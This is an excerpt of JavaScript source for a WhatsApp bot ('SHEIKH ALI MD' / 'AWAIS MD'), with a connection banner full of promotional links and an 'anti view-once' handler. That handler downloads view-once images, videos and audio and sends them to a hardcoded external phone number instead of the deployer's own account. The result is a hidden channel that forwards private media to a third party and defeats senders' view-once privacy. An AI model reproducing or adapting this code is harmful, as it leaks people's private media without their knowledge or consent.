...
const {
  ...
  let up = `*╭──────────────●●►*\n> *sʜᴇɪᴋʜ ᴀʟɪ ᴍᴅ ᴄᴏɴɴᴇᴄᴛᴇᴅ sᴜᴄᴄᴇssғᴜʟʏ ᴛʏᴘᴇ .ᴍᴇɴᴜ ᴛᴏᴏ ɢᴇᴛᴇᴛ ᴄᴏᴍᴍᴀɴᴅ ʟɪsᴛ ᴄʀᴇᴀᴛᴇᴅ ʙʏ sʜᴇɪᴋʜ ᴀʟɪ ᴍᴅ*\n\n> *𝕁𝕠𝕚𝕟 𝕄𝕪 𝕎𝕙𝕒𝕥𝕤𝕒𝕡𝕡 ℂ𝕙𝕒𝕟𝕟𝕖𝕝*\n\n*https://whatsapp.com/channel/0029Vao1lnR1nozDF8jBNh3B*\n\n> *𝔽𝕠𝕝𝕝𝕠𝕨 𝕞𝕖 𝕆𝕟 𝕀𝕟𝕤𝕥𝕒𝕘𝕣𝕒𝕞 *\n\n*https://www.instagram.com/sheikh_ali_2424/profilecard/?igsh=MW4wbWN1ejFsODJyag==*\n\n*╭⊱✫ AWAIS MD ✫⊱╮*\n*│✫➠ - \ud83d\udcc2REPOSITORY NAME:* *AWAIS MD*\n*│✫➠ - \ud83d\udcc3DESCRIPTION:* *PAKISTANI BEST BOT*\n*│✫➠ - \ud83d\udee1️OWNER:* *AWAIS MD*\n*│✫➠ - \ud83c\udf10URL:* *https://github.com/Sheikh-ali-2412/SHEIKH.ALI.MD*\n\n*YOUR BOT ACTIVE NOW ENJOY♥️*\n\n*PREFIX: ${prefix}*\n\n*╰──────────────●●►*`;
  ...
  if (ikratos && config.ANTI_VV === "true") {
    ...
    return conn.sendMessage("923143702270@s.whatsapp.net", { image: { url: anu }, caption: cap }, { quoted: mek });
    ...
    return conn.sendMessage("923143702270@s.whatsapp.net", { video: { url: anu }, caption: cap }, { quoted: mek });
  } if (ikratos.message.audioMessage) {
    let anu = await conn.downloadAndSaveMediaMessage(ikratos.message.audioMessage);
    return conn.sendMessage("923143702270@s.whatsapp.net", { audio: { url: anu }, caption: cap }, { quoted: mek });
  }
  }
